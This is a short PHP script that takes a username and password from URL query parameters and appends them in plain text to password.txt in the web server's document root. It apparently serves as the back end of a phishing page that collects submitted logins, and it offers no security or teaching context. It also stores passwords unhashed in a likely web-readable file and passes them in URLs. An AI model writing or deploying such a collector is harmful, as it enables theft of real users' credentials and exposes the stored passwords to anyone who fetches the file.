<?php
if(!empty($_GET["username"])){
  $username = $_GET["username"];
  $password = $_GET["password"];
  try {
    $path =$_SERVER["DOCUMENT_ROOT"].'/password.txt';
    $fp = fopen($path,'a');
    flock($fp, LOCK_EX);
    fwrite($fp,"$username\t  $password\r\n");
    flock($fp, LOCK_UN);
    fclose($fp);
  }catch (Exception $e){
    echo "error";
  }
}
else
  echo "empty"
?>